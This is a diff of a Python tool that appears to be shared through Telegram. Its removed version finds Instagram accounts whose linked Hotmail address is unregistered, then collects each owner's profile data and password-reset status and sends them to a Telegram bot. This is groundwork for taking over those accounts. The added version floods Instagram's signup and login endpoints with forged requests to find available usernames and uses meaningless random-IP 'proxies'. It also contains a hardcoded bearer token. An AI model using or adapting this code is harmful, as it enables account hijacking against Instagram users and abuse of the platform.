@@ -1,358 +1,326 @@
-import requests, re, random, os, sys
-from rich import print as g
-from rich.panel import Panel
-from threading import Thread, Semaphore
-import webbrowser
+import random
+import os
+try:
+  import requests
+  import random
+  import threading
+  import time
+  from ms4 import UserAgentGenerator
+  from uuid import uuid4
+  from secrets import token_hex
+  from user_agent import generate_user_agent
+  from rich.console import Console
+  from rich.table import Table
+  from rich.text import Text
+except:
+	os.system("pip install ms4==2.10.0 rich")
+	
+import requests
+import random
+import threading
 import time
-from queue import Queue
+from concurrent.futures import ThreadPoolExecutor as tot
+from ms4 import UserAgentGenerator
+from user_agent import generate_user_agent
+from uuid import uuid4
+from secrets import token_hex
+from rich.console import Console
+from rich.table import Table
+from rich.text import Text
 
-webbrowser.open('https://t.me/z3x5j')
+All = "qwertyuiopasdfghjklzxcvbnm"
+Num = "0123456789"
 
-######CHIMOX#####
-R = '\033[1;31;40m'
-X = '\033[1;33;40m' 
-F = '\033[1;32;40m' 
-C = "\033[1;97;40m" 
-B = '\033[1;36;40m'
-K = '\033[1;35;40m'
-V = '\033[1;36;40m'
-######CHIMOX#####
+E = '\033[1;31m'
+X = '\033[1;33m'
+F = '\033[2;32m'
+M = '\x1b[1;37m'
+B = '\x1b[38;5;208m'
+memo = random.randint(100, 300)
+O = f'\x1b[38;5;{memo}m'
 
-# Global counters
-good_hot, bad_hot, good_ig, bad_ig, check, mj = 0, 0, 0, 0, 0, 0
-ids = []
-request_queue = Queue()  # Queue for managing requests
-active_threads = Semaphore(25)  # Limit concurrent threads
+def nx():
+    os.system("clear")
+    Banner = f"""{B}{E}=============================={B}
+|{F}[+] YouTube    : {B}| أحمد الحراني 
+|{F}[+] TeleGram   : {B} maho_s9    
+|{F}[+] Instagram  : {B} ahmedalharrani 
+|{F}[+] Tool  : {B}Available Username IG |
+|{F}[+] sever  : {B} Web |
+{E}==============================
+"""
+    for mm in Banner.splitlines():
+        time.sleep(0.05)
+        print(mm)
 
-# Configuration
-tok = input('• {}TOKEN{} ♪ {}TELE : {}'.format(B,C,V,K))
-print("\r")
-iD = input('• {}ID{} ♪ {}TELE : {}'.format(B,C,V,K))
-os.system('clear')
+nx()
 
-def get_random_user_agent():
-    versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
-    oss = [
-        "Macintosh; Intel Mac OS X 10_15_7",
-        "Macintosh; Intel Mac OS X 10_14_6",
-        "iPhone; CPU iPhone OS 14_0 like Mac OS X",
-        "iPhone; CPU iPhone OS 13_6 like Mac OS X"
-    ]
-    version = random.choice(versions)
-    platform = random.choice(oss)
-    return f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
+token = input(f' {F}({M}1{F}) {M} Enter Token{F}  ' + O)
+print(X + ' ═════════════════════════════════  ')
+ID = input(f' {F}({M}2{F}) {M} Enter ID{F}  ' + O)
 
-def cookie(email):
-    max_retries = 3
-    for attempt in range(max_retries):
-        try:
-            user_agent = get_random_user_agent()
-            url = 'https://signup.live.com'
-            headers = {'user-agent': user_agent}
-            response = requests.get(url, headers=headers, timeout=10)
-            
-            amsc = response.cookies.get_dict().get('amsc', '')
-            match = re.search(r'"apiCanary":"(.*?)"', response.text)
-            api_canary = match.group(1) if match else ''
-            canary = api_canary.encode().decode('unicode_escape') if api_canary else ''
-            
-            if amsc and canary:
-                return amsc, canary
-                
-        except Exception as e:
-            if attempt == max_retries - 1:
-                return None, None
-            time.sleep(random.uniform(1, 3))
+console = Console()
+bb = 0
+gg = 0
 
-def check_hot(email):
-    global good_hot, bad_hot
-    
-    amsc, canary = cookie(email)
-    if not amsc or not canary:
-        return
-        
+def Alhrrani(user, proxy):
+    global gg, bb
+    csr = token_hex(8) * 2
+    headers = {
+    'authority': 'www.instagram.com',
+    'accept': '*/*',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://www.instagram.com',
+    'referer': 'https://www.instagram.com/accounts/login/?next=%2F&source=logged_out_homepage',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"23127PN0CC"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': generate_user_agent(),
+    'x-asbd-id': '129477',
+    'x-csrftoken': csr,
+    'x-ig-app-id': '1217981644879628',
+    'x-ig-www-claim': '0',
+    'x-instagram-ajax': '1016159378',
+    'x-requested-with': 'XMLHttpRequest',
+}
+
+    data = {
+    'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1725333010:AdVQAIKFZ2bJpOIbQENgiygmpue333TXS56Z8NG253JS1LgjbV26LsUm/NuoCsYoNvEgHCTkGBmpCsx7KmPiTnur/Bqzb/hsjbj550lj1SiJEL8RkKyydce7O7cAYiTkAsaitYno1s045I/A5BU9KA==',
+    'loginAttemptSubmissionCount': '0',
+    'optIntoOneTap': 'false',
+    'queryParams': '{"next":"/","source":"logged_out_homepage"}',
+    'trustedDeviceRecords': '{}',
+    'username': user,
+}
     try:
-        user_agent = get_random_user_agent()
-        headers = {
-            'authority': 'signup.live.com',
-            'accept': 'application/json',
-            'accept-language': 'en-US,en;q=0.9',
-            'canary': canary,
-            'user-agent': user_agent,
+      req = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, proxies={'http': proxy}).text
+      if "showAccountRecoveryModal" in req:
+          bb += 1
+      else:
+          gg += 1
+          tlg = f'''
+ Hi hunt Username INSTAGRAM
+⋘─────━*AHMED*━─────⋙
+Good Username : {user}
+Instagram ==√
+BY : @maho_s9 √ CH : @maho9s
+⋘─────━*AHMED*━─────⋙'''
+          print(F + tlg)
+          requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
+    except:
+        bb += 1
+        pass
+ 
+
+    
+def mahos(user, proxy):
+    global gg, bb
+    try:        
+        csr = token_hex(8) * 2
+        uid = uuid4().hex.upper()
+        miid = token_hex(13).upper()
+        dtr = token_hex(13)
+
+        cookies = {
+            'csrftoken': csr,
+            'dpr': '2.1988937854766846',
+            'ps_n': '0',
+            'ps_l': '0',
+            'mid': miid,
+            'ig_did': uid,
+            'datr': dtr,
+            'ig_nrcb': '1',
         }
-        cookies = {'amsc': amsc}
-        data = {'signInName': email + "@hotmail.com"}
-        
-        response = requests.post(
-            'https://signup.live.com/API/CheckAvailableSigninNames',
+
+        headers = {
+            'authority': 'www.instagram.com',
+            'accept': '*/*',
+            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '2.19889',
+            'origin': 'https://www.instagram.com',
+            'referer': 'https://www.instagram.com/accounts/emailsignup/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-platform-version': '""',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': str(UserAgentGenerator()),
+            'viewport-width': '891',
+            'x-asbd-id': '129477',
+            'x-csrftoken': csr,
+            'x-ig-app-id': '936619743392459',
+            'x-ig-www-claim': '0',
+            'x-instagram-ajax': '1012280089',
+            'x-requested-with': 'XMLHttpRequest',
+        }
+
+        timestamp = str(time.time()).split('.')[0]
+        data = {
+           'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:mahos999',
+            'email': 'mahos@mahos.com',
+            'first_name': 'Ahmedalhrrani',
+            'username': user,
+            'client_id': miid,
+            'seamless_login_enabled': '1',
+            'opt_into_one_tap': 'false',
+        }
+
+        res = requests.post(
+            'https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/',
             cookies=cookies,
             headers=headers,
-            json=data,
-            timeout=10
-        )
-        
-        if 'isAvailable' in response.text:
-            good_hot += 1
-            hunting(email)
-        else:
-            bad_hot += 1
-            
-    except Exception as e:
-        pass
+            data=data,
+            proxies={'http': proxy}
+        ).text
 
-def insta_check(email, method):
-    global good_ig, bad_ig
-    
-    try:
-        if method == 1:
-            # Method 1 implementation
-            app = ''.join(random.choice('1234567890') for i in range(15))
-            response = requests.get('https://www.instagram.com/api/graphql', timeout=10)
-            csrf = response.cookies.get_dict().get('csrftoken', '')
-            
-            rnd = str(random.randint(150, 999))
-            user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111, 999)) + ")"
-            
-            data = {
-                'email_or_username': email + "@hotmail.com",
-                'flow': 'fxcal',
-                'recaptcha_challenge_field': '',
-            }
-            
-            headers = {
-                'authority': 'www.instagram.com',
-                'accept': '*/*',
-                'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                'content-type': 'application/x-www-form-urlencoded',
-                'user-agent': user_agent,
-                'viewport-width': '384',
-                'x-asbd-id': '129477',
-                'x-csrftoken': csrf,
-                'x-ig-app-id': app,
-                'x-ig-www-claim': '0',
-                'x-instagram-ajax': '1007832499',
-                'x-requested-with': 'XMLHttpRequest'
-            }
-            
-            response = requests.post(
-                'https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',
-                headers=headers,
-                data=data,
-                timeout=10
-            )
-            
-            if 'email_or_sms_sen' in response.text:
-                good_ig += 1
-                check_hot(email)
-            else:
-                bad_ig += 1
-                
+        if '"dryrun_passed":true,' in res:
+            gg += 1
+            tlg = f'''
+ Hi hunt Username INSTAGRAM
+⋘─────━*AHMED*━─────⋙
+Good Username : {user}
+Instagram ==√
+BY : @maho_s9 √ CH : @maho9s
+⋘─────━*AHMED*━─────⋙'''
+            print(F + tlg)
+            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
+        elif '"errors"' in res and '"username_is_taken"' in res and '"dryrun_passed": false,' in res or 'username_has_special_char' in res:      
+            bb += 1
         else:
-            # Method 2 implementation
-            rnd = str(random.randint(150, 999))
-            user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111, 999)) + ")"
-            
-            url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
-            headers = {
-                'Host': 'www.instagram.com',
-                'origin': 'https://www.instagram.com',
-                'referer': 'https://www.instagram.com/accounts/signup/email/',
-                'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
-                'user-agent': user_agent
-            }
-            data = {'email': email + "@hotmail.com"}
-            
-            response = requests.post(url, headers=headers, data=data, timeout=10)
-            
-            if 'email_is_taken' in response.text:
-                good_ig += 1
-                check_hot(email)
-            else:
-                bad_ig += 1
-                
-    except Exception as e:
-        pass
-
-def date_sc(Id):
-    try:
-        response = requests.get(f"https://mel7n.pythonanywhere.com/?id={Id}", timeout=10).json()
-        return response.get('date', 'Unknown')
+            bb += 1
+            Alhrrani(user, proxy)
     except:
-        return 'Unknown'
-
-def hunting(email):
-    try:
-        headers = {
-            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
-            'X-Pigeon-Rawclienttime': str(int(time.time())),
-            'X-IG-Connection-Speed': '-1kbps',
-            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
-            'X-IG-Bandwidth-TotalBytes-B': '0',
-            'X-IG-Bandwidth-TotalTime-MS': '0',
-            'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
-            'X-IG-Connection-Type': 'WIFI',
-            'X-IG-Capabilities': '3brTvw==',
-            'X-IG-App-ID': '567067343352427',
-            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
-            'Accept-Language': 'en-GB, en-US',
-            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'Accept-Encoding': 'gzip, deflate',
-            'Host': 'i.instagram.com',
-            'X-FB-HTTP-Engine': 'Liger',
-            'Connection': 'keep-alive',
-        }
-        
-        data = {
-            'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"{email}"}}',
-            'ig_sig_key_version': '4',
-        }
-        
-        try:
-            response = requests.post(
-                'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
-                headers=headers,
-                data=data,
-                timeout=10
-            )
-            rest = response.json().get('email', False)
-        except:
-            rest = False
-            
-        try:
-            info = requests.get(
-                f'https://anonyig.com/api/ig/userInfoByUsername/{email}',
-                timeout=10
-            ).json()
-        except:
-            info = None
-            
-        # Extract user info with proper error handling
-        user_info = info.get('result', {}).get('user', {}) if info else {}
-        Id = user_info.get('pk_id')
-        followers = user_info.get('follower_count')
-        following = user_info.get('following_count')
-        post = user_info.get('media_count')
-        name = user_info.get('full_name')
-        date = date_sc(Id) if Id else 'Unknown'
-        
-        hunt_message = f"""
-𝙣𝙚𝙬 𝙝𝙪𝙣𝙩 𝙗𝙧𝙤 𝙜𝙤𝙤𝙙 𝙡𝙪𝙘𝙠 🇵🇸
-⋘━─━𓆩CHAMSOUX𓆪‌‏━─━⋙ 
-𝙣𝙖𝙢𝙚 : {name or 'Unknown'}
-𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 : {email}
-𝙚𝙢𝙖𝙞𝙡 : {email}@hotmail.com
-𝙛𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨 : {followers or 'Unknown'}
-𝙛𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜 : {following or 'Unknown'}
-𝙞𝙙 : {Id or 'Unknown'}
-𝙙𝙖𝙩𝙚 : {date}
-𝙥𝙤𝙨𝙩 : {post or 'Unknown'}
-𝙧𝙚𝙨𝙚𝙩 : {rest}
-⋘━─━𓆩CHAMSOUX𓆪‌‏━─━⋙ 
-𝙗𝙮 : @XJ_JP
-        """
-        
-        # Send to Telegram with retry logic
-        max_telegram_retries = 3
-        for attempt in range(max_telegram_retries):
-            try:
-                requests.post(
-                    f"https://api.telegram.org/bot{tok}/sendMessage",
-                    params={
-                        'chat_id': iD,
-                        'text': hunt_message
-                    },
-                    timeout=10
-                )
-                break
-            except:
-                if attempt == max_telegram_retries - 1:
-                    pass
-                time.sleep(1)
-                
-        # Print to console
-        nnn = random.choice([R, X, F, B, K, V])
-        print(nnn)
-        
-        hunt2 = f"""
-New Hunt Bro Good Luck  
-Name : {name or 'Unknown'}
-Username : {email}
-Email : {email}@hotmail.com
-Followers : {followers or 'Unknown'}
-Following : {following or 'Unknown'}
-Id : {Id or 'Unknown'}
-Date : {date}
-Posts : {post or 'Unknown'}
-Reset : {rest}
-BY : @XJ_JP
-        """
-        
-        Hit = Panel(hunt2)
-        g(Panel(Hit, title=f"Instagram | {good_hot}"))
-        
-    except Exception as e:
+        bb += 1    	
+        Alhrrani(user, proxy)
         pass
+    	
+        
 
-def check_email(email):
-    global check
+def Ahmed(user, proxy):
+    global gg, bb
+    headers = {
+    'authority': 'www.instagram.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2.75',
+    'referer': f'https://www.instagram.com/{user}/',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"23127PN0CC"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': generate_user_agent(),
+    'viewport-width': '980',
+}
+
+    try:
+      res = requests.get(f'https://www.instagram.com/{user}/', headers=headers, proxies={'http': proxy}).text
+      if "<title>Instagram</title>" in res:         
+          mahos(user, proxy)
+      elif "الملف الشخصي" in res and user in res or user in res:
+          bb += 1
+      else:
+          bb += 1
+          mahos(user, proxy)
+    except:
+        bb += 1
+        pass
+        
+    os.system('clear')
+    table = Table(title="Instagram username")
+    table.add_column("Type", justify="center", style="cyan", no_wrap=True)
+    table.add_column("Count", justify="center", style="magenta")
+    table.add_row("GoodInstaUser", str(gg), style="green")
+    table.add_row("BadInstaUser", str(bb), style="red")   
+    table.add_row("Username", user, style="white")
+    table.add_row("Dev", "AHMED ~~ @maho_s9")
+
+    console.print(table)
+
+def Gen(G):
+    usery = ''
+    i = 0 
+    while i < len(G):
+        if G[i] == '#':
+            usery += random.choice(All + Num)  
+        elif G[i] == '*':
+            usery += random.choice(All)  
+        elif G[i] == '"':
+            usery += random.choice(Num)
+        elif G[i] == '_':
+            usery += '_'  
+        elif G[i] == '.':
+            usery += '.'  
+        elif G[i:i+2] == '@@':
+            usery += random.choice(All) * 2 
+            i += 1
+        elif G[i:i+2] == '§§':
+            usery += random.choice(Num) * 2  
+            i += 1  
+        else:
+            usery += G[i]
+        
+        i += 1  
     
-    # Choose method randomly
-    method = random.choice([1, 2])
-    insta_check(email, method)
+    return usery
+
+Gs = [
+    "#_#_#",
+    "_#_#_",
+    "##.##",
+    "#.###",
+    "##_##",
+    "###__",
+    "__###",
+    "**.**",
+    "@@_§§",
+    "§§.@@",
+    "§§_@@",
+    "@@.§§",
+    "_###_",
+    '**_""',
+    ".####",
+    "#.#.#",
+    "#_#.#",
+    "#.#_#",
+    "#.#_#",
+    "##_##",
+    "#_###",
+    "###_#",
+    "#.##_",
+    "##.##",
+    "#.##.#",
+    "#_##.#"
+]
+with tot(max_workers=2) as los:
+  while True:
+    ah = random.choice(Gs)
+    user = Gen(ah)
+    ip = ".".join(str(random.randint(0, 255)) for _ in range(4))        
+    pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
+    port = random.choice(pl)
+    proxy = ip + ":" + str(port)        
+    los.submit(Ahmed, user, proxy)
     
-    # Update console output
-    b = random.randint(5, 208)
-    bo = f'\x1b[38;5;{b}m'
-    check += 1
     
-    sys.stdout.write(f"\r   {bo}[ {C}CHIMOX ™ {bo}] {C}Good Hot : {F}{good_hot}  {C}Bad IG : {R}{bad_ig}  {C}Good IG : {X}{good_ig}  {C}{bo}Check•{check}\r")
-    sys.stdout.flush()
-
-def username_worker():
-    while True:
-        try:
-            with active_threads:
-                headers = {
-                    "x-bloks-version-id": "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
-                    "user-agent": "Instagram 275.0.0.27.98 Android (28/9; 240dpi; 720x1280; Asus; ASUS_I003DD; ASUS_I003DD; intel; en_US; 458229258)",
-                    "authorization": "Bearer IGT:2:eyJkc191c2VyX2lkIjoiNTI1MjEwODYyODIiLCJzZXNzaW9uaWQiOiI1MjUyMTA4NjI4MiUzQUt4VGg2UUFzam5teVlIJTNBMjUlM0FBWWQtcXhaZGRTanNyQ3o2eW1ud0NuUGNINFpwbVd1a0JMN2p4Wm5Gb2cifQ==",
-                }
-                
-                id = str(random.randrange(128053904, 438909537))
-                data = {
-                    "lsd": id,
-                    "variables": '{"id":"' + id + '","render_surface":"PROFILE"}',
-                    "server_timestamps": 'true',
-                    "doc_id": '25313068075003303'
-                }
-                headers['X-Fb-Lsd'] = id
-                
-                response = requests.post(
-                    "https://www.instagram.com/api/graphql",
-                    headers=headers,
-                    data=data,
-                    timeout=10
-                ).json()
-                
-                if 'data' in response and 'user' in response['data'] and 'username' in response['data']['user']:
-                    username = response['data']['user']['username']
-                    check_email(username)
-                    
-        except Exception as e:
-            time.sleep(random.uniform(1, 3))
-            
-        # Add delay between requests to avoid rate limiting
-        time.sleep(random.uniform(0.5, 2))
-
-# Start worker threads
-for i in range(25):
-    Thread(target=username_worker, daemon=True).start()
-
-# Keep main thread alive
-try:
-    while True:
-        time.sleep(1)
-except KeyboardInterrupt:
-    print("\nShutting down gracefully...")
-    sys.exit(0)
